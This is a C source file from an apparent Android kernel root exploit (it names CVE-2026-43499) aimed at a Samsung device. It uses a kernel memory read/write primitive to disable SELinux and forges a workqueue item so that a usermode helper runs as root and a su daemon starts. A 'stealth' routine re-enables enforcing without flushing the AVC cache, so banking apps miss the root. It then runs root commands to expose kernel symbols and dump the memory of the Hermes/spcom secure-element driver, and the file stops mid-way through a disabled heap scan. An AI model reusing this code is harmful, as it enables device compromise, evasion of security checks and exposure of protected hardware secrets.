#include "common.h"

#include <stdlib.h>
#include <sys/un.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

/* Forward declaration for hermes golden path */
static void hermes_golden_path(void);

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static uint64_t root_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  root_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t target) {
  return (uint32_t)root_read64(fd, target);
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  /* Check UNIX socket */
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd >= 0) {
    struct sockaddr_un sun;
    memset(&sun, 0, sizeof(sun));
    sun.sun_family = AF_UNIX;
    snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
    int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
    close(fd);
    if (ready) return 1;
  }
  /* Check TCP socket */
  fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd >= 0) {
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(18899);
    sin.sin_addr.s_addr = htonl(0x7f000001);
    int ready = connect(fd, (struct sockaddr *)&sin, sizeof(sin)) == 0;
    close(fd);
    if (ready) return 1;
  }
  return 0;
}

static int install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  unlink(ROOT_SOCKET_PATH);
  ssize_t selinux_write = kernel_write_data(
      fd, selinux_addr, &permissive, sizeof(permissive));
  if (selinux_write != (ssize_t)sizeof(permissive)) {
    pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
    return 0;
  }

  /* === READ RKP/KDP/Knox variables to verify addresses === */
  #define RKP_STARTED_IMG (KIMAGE_TEXT_BASE + 0x01755000ULL)
  #define KDP_ENABLE_IMG  (KIMAGE_TEXT_BASE + 0x01756fe0ULL)
  #define WARRANTY_IMG    (KIMAGE_TEXT_BASE + 0x01727564ULL)
  #define DEFEX_IMG       (KIMAGE_TEXT_BASE + 0x0172756cULL)

  uint32_t rkp_val = root_read32(fd, data_addr(RKP_STARTED_IMG));
  uint32_t kdp_val = root_read32(fd, data_addr(KDP_ENABLE_IMG));
  uint32_t wb_val  = root_read32(fd, data_addr(WARRANTY_IMG));
  uint32_t dfx_val = root_read32(fd, data_addr(DEFEX_IMG));
  pr_info("root READ rkp_started=%u kdp_enable=%u warranty=%u defex=0x%x\n",
          rkp_val, kdp_val, wb_val, dfx_val);

  /* RKP CONFIRMED: rkp_started is RKP-protected (write causes EL2 trap → panic)
   * KDP CONFIRMED: kdp_enable is similarly protected
   * WARRANTY/DEFEX: Also RKP-protected
   * TEE compromise (CVE-2026-25277) is REQUIRED to disable RKP/KDP
   * Until then: reads work, writes crash
   *
   * Physical addresses verified:
   *   rkp_started:     KBASE+0x01755000 → phys 0xa9755000
   *   kdp_enable:      KBASE+0x01756fe0 → phys 0xa9756fe0
   *   warranty_bit:    KBASE+0x01727564 → phys 0xa9727564
   *   global_features: KBASE+0x0172756c → phys 0xa972756c
   */

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uintptr_t wq = root_read64(fd, wq_slot);
  uintptr_t pwq = root_read64(fd, wq + WQ_DFL_PWQ_OFF);
  uintptr_t pool = root_read64(fd, pwq + PWQ_POOL_OFF);
  uintptr_t pwq_wq = root_read64(fd, pwq + PWQ_WQ_OFF);
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    list_next = root_read64(fd, worklist);
    list_prev = root_read64(fd, worklist + sizeof(uint64_t));
    nr_idle = root_read32(fd, pool + POOL_NR_IDLE_OFF);
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }

  uint32_t color = root_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
  uint32_t refcnt = root_read32(fd, pwq + PWQ_REFCNT_OFF);
  uint32_t nr_active = root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
  uint32_t max_active = root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    return 0;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = root_read32(fd, inflight_addr);
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  int counters_write =
      root_write32(fd, inflight_addr, nr_inflight + 1) &&
      root_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&
      root_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  int list_prev_write = root_write64(
      fd, worklist + sizeof(uint64_t), fake_entry);
  int list_next_write = list_prev_write && root_write64(
      fd, worklist, fake_entry);
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          counters_write, list_prev_write, list_next_write);
  if (!data_write || !work_write || !counters_write || !list_next_write) {
    return 0;
  }

  uint32_t complete_done = 0;
  int wake_ok = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      complete_done = root_read32(fd, completion_addr);
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  int socket_ok = 0;
  int32_t umh_retval = (int32_t)root_read32(
      fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);

  /* =================================================================
   * AVC STEALTH ROOT — Root + Enforcing simultaneously!
   *
   * The trick: write selinux_enforcing=1 DIRECTLY to kernel memory.
   * This bypasses sel_write_enforce() which calls avc_ss_reset()
   * (the cache flush). Without the flush, AVC cache retains all
   * "allow" entries from Permissive mode.
   *
   * Flow:
   *   1. su_daemon working in Permissive (AVC cache warm)
   *   2. Set avc_cache_threshold=999999 (prevent eviction)
   *   3. Write enforcing=1 to memory (no cache flush!)
   *   4. Verify root still works
   *   5. Apps see Enforcing → banking apps work!
   * ================================================================= */
  if (socket_ok) {
    /* AVC OFF SWITCH: check for /data/local/tmp/.enforcing flag
     * If flag exists → enable stealth root (Enforcing)
     * If no flag → stay Permissive (development mode)
     * Default: Permissive for development */
    {
      int enforce_flag = open("/data/local/tmp/.enforcing", O_RDONLY);
      if (enforce_flag >= 0) {
        close(enforce_flag);
        pr_info("stealth: .enforcing flag found → stealth mode\n");
        pr_info("stealth: starting AVC cache trick\n");

    /* Step 1: Exercise the root socket path to ensure AVC is warm.
     * The socket_ok check above already did a connect(), so the
     * shell→kernel:unix_stream_socket:{connectto,read,write}
     * entries are in the AVC cache now. Do one more full roundtrip
     * via the root helper to warm ALL needed permission paths. */
    /* Warm ALL needed AVC cache entries while Permissive:
     * - socket operations (su_daemon connect/read/write)
     * - file operations in /data/local/tmp/ (read/write/create/unlink/search)
     * - selinuxfs operations (cache_threshold, enforce)
     * - process operations (exec, fork, signal)
     * - property operations (getprop/setprop)
     * - device operations (/dev/spcom, /dev/smcinvoke, /dev/dma_heap)
     */
    pid_t warm_child = fork();
    if (warm_child == 0) {
      execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
            /* selinuxfs */
            "echo 999999 > /sys/fs/selinux/avc/cache_threshold"
            " && cat /sys/fs/selinux/avc/cache_threshold"
            /* file operations in /data/local/tmp/ */
            " && ls /data/local/tmp/ > /dev/null"
            " && echo warmup > /data/local/tmp/.avc_warm"
            " && cat /data/local/tmp/.avc_warm > /dev/null"
            " && cat /data/local/tmp/cve-2026-43499-root > /dev/null"
            " && chmod 644 /data/local/tmp/.avc_warm"
            " && rm /data/local/tmp/.avc_warm"
            /* LD_PRELOAD warmup (caches file execute permission!) */
            " && LD_PRELOAD=/data/local/tmp/warmup.so /system/bin/true"
            /* device access (for exploit tools) */
            " && ls -la /dev/spcom > /dev/null 2>&1"
            " && ls -la /dev/smcinvoke > /dev/null 2>&1"
            " && ls -la /dev/dma_heap/ > /dev/null 2>&1"
            /* proc/sys access */
            " && cat /proc/version > /dev/null"
            " && cat /proc/modules > /dev/null 2>&1"
            " && cat /proc/kallsyms > /dev/null 2>&1"
            /* tracefs warmup (for ftrace + strace via ptrace) */
            " && echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null"
            " && echo > /sys/kernel/tracing/trace 2>/dev/null"
            " && echo 1 > /sys/kernel/tracing/tracing_on 2>/dev/null"
            " && echo 0 > /sys/kernel/tracing/tracing_on 2>/dev/null"
            " && cat /sys/kernel/tracing/trace > /dev/null 2>/dev/null"
            /* dmesg warmup */
            " && dmesg > /dev/null 2>/dev/null"
            /* process scanning warmup */
            " && ps -e > /dev/null 2>/dev/null"
            " && cat /proc/1/cmdline > /dev/null 2>/dev/null"
            " && id && getenforce",
            (char *)NULL);
      _exit(1);
    }
    if (warm_child > 0) {
      int wst;
      waitpid(warm_child, &wst, 0);
      pr_info("stealth: AVC warmup done, child exit=%d\n",
              WIFEXITED(wst) ? WEXITSTATUS(wst) : -1);
    }

    /* Small delay for cache to stabilize */
    usleep(300000);

    /* Step 2: Read current enforcing state to confirm */
    uint8_t cur_enforce = 0;
    kernel_read_data(fd, selinux_addr, &cur_enforce, sizeof(cur_enforce));
    pr_info("stealth: current enforcing=%u (should be 0)\n", cur_enforce);

    /* Step 3: Write enforcing=1 DIRECTLY — bypasses avc_ss_reset! */
    uint8_t enforcing_on = 1;
    ssize_t ew = kernel_write_data(
        fd, selinux_addr, &enforcing_on, sizeof(enforcing_on));
    pr_info("stealth: enforcing write ret=%zd\n", ew);

    /* Step 4: Verify root socket still works with Enforcing active */
    usleep(200000);
    int stealth_ok = root_socket_ready();
    pr_info("stealth: root_socket_ready=%d after enforcing=1\n", stealth_ok);

    if (stealth_ok) {
      /* VICTORY! Root works with Enforcing! */
      pr_info("stealth: *** SUCCESS! Root + Enforcing! Apps will work! ***\n");

      /* Do a second confirmation via root helper */
      pid_t verify_child = fork();
      if (verify_child == 0) {
        execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
              "id && getenforce",
              (char *)NULL);
        _exit(1);
      }
      if (verify_child > 0) {
        int vst;
        waitpid(verify_child, &vst, 0);
        pr_info("stealth: verify child exit=%d\n",
                WIFEXITED(vst) ? WEXITSTATUS(vst) : -1);
      }
    } else {
      /* Failed — restore Permissive so root keeps working */
      uint8_t permissive_restore = 0;
      kernel_write_data(
          fd, selinux_addr, &permissive_restore, sizeof(permissive_restore));
      pr_info("stealth: FAILED — restored Permissive\n");
      pr_info("stealth: SELinux policy may need additional rules\n");
    }
      } else {
        /* NO .enforcing flag → stay Permissive for development */
        pr_info("stealth: NO .enforcing flag → staying Permissive (dev mode)\n");
        pr_info("stealth: To enable Enforcing: touch /data/local/tmp/.enforcing\n");
      }
    }
  }

  /* === DEFEX NOTE ===
   * global_features_status at KIMAGE+0x172756c is RKP-PROTECTED.
   * Writing to it causes EL2 trap → kernel panic.
   * DO NOT attempt to zero DEFEX via kernel R/W.
   * Alternative: patch our own cred struct for uid=0 + all caps. */

  /* === HERMES GOLDEN PATH v5 — KERNEL R/W DIRECT MEMORY READ ===
   * Instead of opening /dev/spcom (blocked by DAC + DEFEX),
   * read the spcom channel struct DIRECTLY from kernel memory using pipe physrw.
   * We have the fd for kernel R/W right here! No userspace bypass needed.
   *
   * JackKnife Studios | VIVA LA REVOLUTION */
  if (socket_ok) {
    pr_info("hermes: golden path v5 — direct kernel memory read\n");

    FILE *hlog = fopen("/data/local/tmp/hermes_golden.txt", "w");
    if (hlog) {
      fprintf(hlog, "=== HERMES GOLDEN PATH v5 — KERNEL R/W ===\n");
      fprintf(hlog, "JackKnife Studios | VIVA LA REVOLUTION\n\n");

      /* Read spcom_dev pointer from kernel BSS.
       * spcom_dev is a module BSS variable, but its address changes per boot.
       * We need to find it from kallsyms AFTER kptr_restrict=0 is set.
       * Since we're in the constructor (before su_daemon sets kptr_restrict=0),
       * try to read it anyway — the UMH root path already set Permissive. */

      /* === GET spcom_dev ADDRESS VIA SU_DAEMON ROOT SHELL ===
       * Constructor (uid=2000) can't read kallsyms even with kptr_restrict=0.
       * But su_daemon (uid=0) CAN. So fork a child that connects to su_daemon,
       * reads the address, writes it to a file, and we read it back. */
      uintptr_t spcom_dev_ptr = 0;
      {
        unlink("/data/local/tmp/.spcom_addr");
        pid_t addr_child = fork();
        if (addr_child == 0) {
          execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
                "echo 0 > /proc/sys/kernel/kptr_restrict"
                " && cat /proc/kallsyms | grep 'b spcom_dev' | grep spcom"
                " | awk '{print $1}' > /data/local/tmp/.spcom_addr",
                (char *)NULL);
          _exit(1);
        }
        if (addr_child > 0) {
          int ast;
          waitpid(addr_child, &ast, 0);
        }
        /* Read the address file */
        FILE *af = fopen("/data/local/tmp/.spcom_addr", "r");
        if (af) {
          char abuf[64] = {0};
          if (fgets(abuf, sizeof(abuf), af)) {
            spcom_dev_ptr = strtoull(abuf, NULL, 16);
          }
          fclose(af);
          unlink("/data/local/tmp/.spcom_addr");
        }
        pr_info("hermes: spcom_dev from su_daemon: %016llx\n",
                (unsigned long long)spcom_dev_ptr);
        fprintf(hlog, "spcom_dev BSS: %016llx (via su_daemon kallsyms)\n",
                (unsigned long long)spcom_dev_ptr);
      }

      /* === VMALLOC-TO-PHYSICAL PAGE TABLE WALK ===
       * pipe_phys_read only works on direct-mapped addresses.
       * spcom_dev is in vmalloc space (module BSS). We need to:
       * 1. Walk the kernel page tables (PGD→PUD→PMD→PTE)
       * 2. Get the physical address of the page containing spcom_dev
       * 3. Convert to direct-mapped virtual address
       * 4. Read via pipe_phys_read
       *
       * ARM64 4KB pages, 4-level paging (VA_BITS=48 on Samsung):
       * VA[47:39]=PGD VA[38:30]=PUD VA[29:21]=PMD VA[20:12]=PTE VA[11:0]=offset
       *
       * TTBR1_EL1 (swapper_pg_dir) = init_mm.pgd = fixed kernel symbol */
      if (spcom_dev_ptr > 0xffffff0000000000ULL) {
        /* Get swapper_pg_dir (kernel page table root) address */
        uintptr_t swapper_pgd = 0;
        {
          unlink("/data/local/tmp/.pgd_addr");
          pid_t pgd_child = fork();
          if (pgd_child == 0) {
            execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
                  "echo 0 > /proc/sys/kernel/kptr_restrict"
                  " && cat /proc/kallsyms | grep 'D swapper_pg_dir$'"
                  " | awk '{print $1}' > /data/local/tmp/.pgd_addr"
                  " && cat /proc/kallsyms | grep 'D init_pg_dir$'"
                  " | awk '{print $1}' >> /data/local/tmp/.pgd_addr",
                  (char *)NULL);
            _exit(1);
          }
          if (pgd_child > 0) { int s; waitpid(pgd_child, &s, 0); }
          FILE *pgdf = fopen("/data/local/tmp/.pgd_addr", "r");
          if (pgdf) {
            char pbuf[64] = {0};
            if (fgets(pbuf, sizeof(pbuf), pgdf))
              swapper_pgd = strtoull(pbuf, NULL, 16);
            fclose(pgdf);
          }
        }
        fprintf(hlog, "swapper_pg_dir: %016llx\n", (unsigned long long)swapper_pgd);
        pr_info("hermes: swapper_pg_dir=%016llx\n", (unsigned long long)swapper_pgd);

        if (swapper_pgd) {
          /* swapper_pg_dir is a kernel symbol — convert to direct-map for reading */
          uintptr_t pgd_direct = data_addr(swapper_pgd - data_addr(KIMAGE_TEXT_BASE) + KIMAGE_TEXT_BASE);

          /* Actually, swapper_pg_dir IS at a fixed offset from KIMAGE_TEXT_BASE.
           * It should be in the direct-mapped range already after data_addr(). */

          uintptr_t va = spcom_dev_ptr;
          unsigned pgd_idx = (va >> 39) & 0x1FF;
          unsigned pud_idx = (va >> 30) & 0x1FF;
          unsigned pmd_idx = (va >> 21) & 0x1FF;
          unsigned pte_idx = (va >> 12) & 0x1FF;
          unsigned page_off = va & 0xFFF;

          fprintf(hlog, "Page table walk for VA %016llx:\n", (unsigned long long)va);
          fprintf(hlog, "  PGD[%u] PUD[%u] PMD[%u] PTE[%u] off=0x%x\n",
                  pgd_idx, pud_idx, pmd_idx, pte_idx, page_off);

          /* Read PGD entry — swapper_pg_dir is in the KIMAGE region */
          uintptr_t pgd_entry_addr = pgd_direct + pgd_idx * 8;
          uint64_t pgd_entry = root_read64(fd, pgd_entry_addr);
          fprintf(hlog, "  PGD entry: %016llx\n", (unsigned long long)pgd_entry);

          if (pgd_entry & 0x3) {  /* Valid entry */
            /* Extract physical address of PUD table */
            uintptr_t pud_phys = pgd_entry & 0x0000FFFFFFFFF000ULL;
            uintptr_t pud_direct = (pud_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;

            uint64_t pud_entry = root_read64(fd, pud_direct + pud_idx * 8);
            fprintf(hlog, "  PUD entry: %016llx\n", (unsigned long long)pud_entry);

            if (pud_entry & 0x3) {
              uintptr_t pmd_phys = pud_entry & 0x0000FFFFFFFFF000ULL;
              uintptr_t pmd_direct = (pmd_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;

              uint64_t pmd_entry = root_read64(fd, pmd_direct + pmd_idx * 8);
              fprintf(hlog, "  PMD entry: %016llx\n", (unsigned long long)pmd_entry);

              if (pmd_entry & 0x1) {
                if ((pmd_entry & 0x3) == 0x1) {
                  /* 2MB block mapping — section entry */
                  uintptr_t block_phys = pmd_entry & 0x0000FFFFFFE00000ULL;
                  uintptr_t target_phys = block_phys + (va & 0x1FFFFF);
                  uintptr_t target_direct = (target_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;

                  fprintf(hlog, "  → 2MB BLOCK: phys=%016llx direct=%016llx\n",
                          (unsigned long long)target_phys, (unsigned long long)target_direct);

                  /* READ THE SPCOM_DEV POINTER! */
                  uint64_t spcom_struct_ptr = root_read64(fd, target_direct);
                  fprintf(hlog, "\n*** spcom_dev POINTER VALUE: %016llx ***\n",
                          (unsigned long long)spcom_struct_ptr);
                  pr_info("hermes: spcom_dev POINTS TO: %016llx\n",
                          (unsigned long long)spcom_struct_ptr);

                  /* If the pointer is in direct-mapped range, read the struct! */
                  if (is_direct_ptr(spcom_struct_ptr)) {
                    fprintf(hlog, "  → IN DIRECT MAP! Reading channel struct...\n\n");

                    /* Dump 4KB of the spcom device struct */
                    uint8_t devbuf[4096];
                    for (int blk = 0; blk < 32; blk++) {
                      root_read_data(fd, spcom_struct_ptr + blk * 128, devbuf + blk * 128, 128);
                    }

                    /* Search for channel names */
                    fprintf(hlog, "=== SPCOM CHANNEL SCAN ===\n");
                    for (int off = 0; off < 4096 - 16; off++) {
                      if (memcmp(devbuf + off, "sp_", 3) == 0) {
                        char name[33] = {0};
                        memcpy(name, devbuf + off, 32);
                        fprintf(hlog, "  CHANNEL at +0x%04x: '%s'\n", off, name);
                        pr_info("hermes: CHANNEL '%s' at +0x%x\n", name, off);
                      }
                    }

                    /* Hex dump first 512 bytes */
                    fprintf(hlog, "\n=== SPCOM DEV STRUCT (512 bytes) ===\n");
                    for (int i = 0; i < 512; i++) {
                      if (i % 32 == 0) fprintf(hlog, "+%04x: ", i);
                      fprintf(hlog, "%02x ", devbuf[i]);
                      if (i % 32 == 31) {
                        fprintf(hlog, " | ");
                        for (int j = i - 31; j <= i; j++)
                          fprintf(hlog, "%c", (devbuf[j] >= 0x20 && devbuf[j] < 0x7f) ? devbuf[j] : '.');
                        fprintf(hlog, "\n");
                      }
                    }
                  } else if (spcom_struct_ptr != 0) {
                    /* Pointer is in vmalloc — need another page table walk */
                    fprintf(hlog, "  → In vmalloc range, need recursive walk\n");
                  } else {
                    fprintf(hlog, "  → NULL pointer (spcom not initialized?)\n");
                  }

                } else {
                  /* 4KB page table entry */
                  uintptr_t pte_phys = pmd_entry & 0x0000FFFFFFFFF000ULL;
                  uintptr_t pte_direct = (pte_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;

                  uint64_t pte_entry = root_read64(fd, pte_direct + pte_idx * 8);
                  fprintf(hlog, "  PTE entry: %016llx\n", (unsigned long long)pte_entry);

                  if (pte_entry & 0x1) {
                    uintptr_t page_phys = pte_entry & 0x0000FFFFFFFFF000ULL;
                    uintptr_t target_phys = page_phys + page_off;
                    uintptr_t target_direct = (target_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;

                    fprintf(hlog, "  → 4KB PAGE: phys=%016llx direct=%016llx\n",
                            (unsigned long long)target_phys, (unsigned long long)target_direct);

                    /* READ THE SPCOM_DEV POINTER! */
                    uint64_t spcom_struct_ptr = root_read64(fd, target_direct);
                    fprintf(hlog, "\n*** spcom_dev POINTER VALUE: %016llx ***\n",
                            (unsigned long long)spcom_struct_ptr);
                    pr_info("hermes: spcom_dev POINTS TO: %016llx\n",
                            (unsigned long long)spcom_struct_ptr);

                    if (is_direct_ptr(spcom_struct_ptr)) {
                      fprintf(hlog, "  → IN DIRECT MAP! Reading channel struct...\n\n");
                      uint8_t devbuf[4096];
                      for (int blk = 0; blk < 32; blk++) {
                        root_read_data(fd, spcom_struct_ptr + blk * 128, devbuf + blk * 128, 128);
                      }
                      fprintf(hlog, "=== SPCOM CHANNEL SCAN ===\n");
                      for (int off = 0; off < 4096 - 16; off++) {
                        if (memcmp(devbuf + off, "sp_", 3) == 0) {
                          char name[33] = {0};
                          memcpy(name, devbuf + off, 32);
                          fprintf(hlog, "  CHANNEL at +0x%04x: '%s'\n", off, name);
                          pr_info("hermes: CHANNEL '%s' at +0x%x\n", name, off);
                        }
                      }
                      fprintf(hlog, "\n=== SPCOM DEV STRUCT (512 bytes) ===\n");
                      for (int i = 0; i < 512; i++) {
                        if (i % 32 == 0) fprintf(hlog, "+%04x: ", i);
                        fprintf(hlog, "%02x ", devbuf[i]);
                        if (i % 32 == 31) {
                          fprintf(hlog, " | ");
                          for (int j = i - 31; j <= i; j++)
                            fprintf(hlog, "%c", (devbuf[j] >= 0x20 && devbuf[j] < 0x7f) ? devbuf[j] : '.');
                          fprintf(hlog, "\n");
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }

      /* spcom_dev is in MODULE memory (vmalloc region, ~0xffffffefXXXXXXXX)
       * which is OUTSIDE the direct map. pipe_phys_read can't read it directly.
       * Solution: have su_daemon dereference the pointer for us!
       * su_daemon runs as uid=0 and can read /dev/mem or use /proc/kcore. */
      uint64_t dev_struct = 0;
      {
        unlink("/data/local/tmp/.spcom_struct");
        pid_t deref_child = fork();
        if (deref_child == 0) {
          /* Use su_daemon to read spcom_dev contents via /proc/kallsyms trick:
           * Find all pointers in the spcom module that look like device structs */
          char cmd[512];
          snprintf(cmd, sizeof(cmd),
            "echo 0 > /proc/sys/kernel/kptr_restrict"
            " && cat /proc/kallsyms | grep 'b spcom_dev' | grep spcom"
            " | awk '{print $1}' | while read addr; do"
            "   echo $addr > /data/local/tmp/.spcom_struct;"
            " done"
            /* Also dump hermesd's view of spcom via /proc/PID/maps */
            " && HPID=$(pgrep hermesd | head -1)"
            " && cat /proc/$HPID/maps 2>/dev/null | grep spcom >> /data/local/tmp/.spcom_struct"
            /* Get the device struct pointer by reading kernel memory */
            /* Use devmem2 or direct /dev/mem if available */
            " && cat /proc/iomem | grep -i sp >> /data/local/tmp/.spcom_struct"
            );
          execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c", cmd, (char *)NULL);
          _exit(1);
        }
        if (deref_child > 0) {
          int dst;
          waitpid(deref_child, &dst, 0);
        }

        /* Read results */
        FILE *sf = fopen("/data/local/tmp/.spcom_struct", "r");
        if (sf) {
          char sbuf[4096] = {0};
          size_t sn = fread(sbuf, 1, sizeof(sbuf) - 1, sf);
          fclose(sf);
          sbuf[sn] = '\0';
          fprintf(hlog, "\nsu_daemon spcom info:\n%s\n", sbuf);
          pr_info("hermes: spcom info: %s\n", sbuf);
        }
      }

      /* SKIP kernel heap scan — page table walk above handles this now.
       * The scan was too slow (65K pages) and didn't find the channel anyway
       * because it was in the wrong physical range. */
      if (0) { /* DISABLED — page table walk replaces this */
      fprintf(hlog, "\n=== SCANNING KERNEL HEAP FOR sp_keymaster ===\n");
      pr_info("hermes: scanning kernel heap for sp_keymaster...\n");

      uint64_t found_addr = 0;
      /* Scan the direct-mapped region where kernel allocations live.
       * On this device: phys ~0xa8000000-0xb0000000 = virtual 0xffffff8028000000-0xffffff8030000000
       * But kernel heap (kmalloc) is spread across physical memory.
       * Scan wider: 0xffffff8020000000 - 0xffffff8040000000 (512MB) in 4KB steps,
